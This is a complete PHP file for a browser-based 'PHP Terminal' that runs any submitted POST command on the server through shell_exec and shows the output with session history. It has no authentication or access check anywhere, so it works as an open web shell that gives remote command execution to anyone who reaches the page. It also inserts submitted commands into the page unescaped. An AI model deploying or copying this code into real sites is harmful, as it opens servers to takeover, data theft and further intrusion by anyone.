<?php
session_start();

// Initialize history and current directory
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = array();
}
if (!isset($_SESSION['output_history'])) {
    $_SESSION['output_history'] = array();
}
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Handle session reset
if (isset($_POST['reset'])) {
    session_unset();
    session_destroy();
    session_start();
    $_SESSION['history'] = array();
    $_SESSION['output_history'] = array();
    $_SESSION['cwd'] = getcwd();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle command execution
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = '';

    // Add command to history
    if (!empty($command)) {
        $_SESSION['history'][] = $command;
    }

    // Handle cls and clear commands
    if ($command === 'cls' || $command === 'clear') {
        $_SESSION['output_history'] = array();
    } else if (preg_match('/^cd\s*(.*)/', $command, $matches)) {
        // Handle cd commands
        $dir = trim($matches[1]);
        if (empty($dir)) {
            // Display current directory if no argument is provided
            $output = $_SESSION['cwd'];
        } elseif ($dir === '~') {
            // Change to home directory
            $_SESSION['cwd'] = getenv('USERPROFILE') ?: getenv('HOME');
        } elseif (preg_match('/^[a-zA-Z]:$/', $dir)) {
            // Handle drive letter change
            $_SESSION['cwd'] = $dir . DIRECTORY_SEPARATOR;
        } else {
            // Handle relative and absolute paths
            $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $dir);
            if ($newPath && is_dir($newPath)) {
                $_SESSION['cwd'] = $newPath;
            } else {
                $output = "Directory not found: $dir\n";
            }
        }
    } else {
        // Execute other commands
        chdir($_SESSION['cwd']);
        $output = shell_exec($command . ' 2>&1');
        $output = iconv('CP437', 'UTF-8//TRANSLIT//IGNORE', $output);
    }

    // Save output to history
    $_SESSION['output_history'][] = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');

    // Return JSON response for AJAX requests
    if (isset($_POST['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode([
            'output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8'),
            'currentPath' => htmlspecialchars($_SESSION['cwd'], ENT_QUOTES, 'UTF-8')
        ]);
        exit;
    }
}

$currentPath = $_SESSION['cwd'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Terminal</title>
    <style>
        body {
            background-color: black;
            color: limegreen;
            font-family: 'Courier New', monospace;
        }
        .terminal {
            width: 80%;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid limegreen;
            background-color: black;
        }
        .output {
            white-space: pre-wrap;
            word-wrap: break-word;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }
        .prompt {
            color: limegreen;
            margin-bottom: 5px;
        }
        input[type="text"] {
            width: calc(100% - 20px);
            padding: 5px;
            border: none;
            background-color: black;
            color: limegreen;
            font-family: 'Courier New', monospace;
        }
        .command-line {
            display: flex;
            align-items: center;
            margin-top: 10px;
        }
        .reset-button {
            margin-top: 10px;
            padding: 10px;
            border: 1px solid limegreen;
            background-color: black;
            color: limegreen;
            font-family: 'Courier New', monospace;
            cursor: pointer;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('.command-line form');
            const input = document.querySelector('input[name="command"]');
            const outputDiv = document.querySelector('.output');
            const promptSpan = document.querySelector('.prompt');
            let historyIndex = <?php echo count($_SESSION['history']); ?>;
            const history = <?php echo json_encode($_SESSION['history']); ?>;
            const outputHistory = <?php echo json_encode($_SESSION['output_history']); ?>;
            
            // Display previous output history
            outputHistory.forEach(output => {
                outputDiv.innerHTML += `<div>${output}</div>`;
            });

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const command = input.value;
                
                if (command) {
                    // Add to history
                    history.push(command);
                    historyIndex = history.length;
                    
                    // Send command via AJAX
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'php-terminal.php', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            const response = JSON.parse(xhr.responseText);
                            if (command === 'cls' || command === 'clear') {
                                outputDiv.innerHTML = '';
                            } else {
                                outputDiv.innerHTML += `<div>${promptSpan.textContent}${command}</div>`;
                                outputDiv.innerHTML += `<div>${response.output}</div>`;
                            }
                            promptSpan.textContent = response.currentPath + '>';
                            outputDiv.scrollTop = outputDiv.scrollHeight;
                        }
                    };
                    xhr.send('command=' + encodeURIComponent(command) + '&ajax=1');
                    
                    input.value = '';
                }
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    if (historyIndex > 0) {
                        historyIndex--;
                        input.value = history[historyIndex];
                    }
                } else if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    if (historyIndex < history.length - 1) {
                        historyIndex++;
                        input.value = history[historyIndex];
                    } else {
                        historyIndex = history.length;
                        input.value = '';
                    }
                } else if (e.key === 'Enter') {
                    e.preventDefault();
                    form.dispatchEvent(new Event('submit'));
                }
            });
        });
    </script>
</head>
<body>
    <div class="terminal">
        <div class="output"></div>
        <div class="command-line">
            <span class="prompt"><?php echo htmlspecialchars($currentPath, ENT_QUOTES, 'UTF-8'); ?>></span>
            <form method="post" style="flex-grow: 1;">
                <input type="text" name="command" placeholder="" autofocus autocomplete="off">
            </form>
        </div>
        <form method="post">
            <button type="submit" name="reset" class="reset-button">Restart Session</button>
        </form>
    </div>
</body>
</html>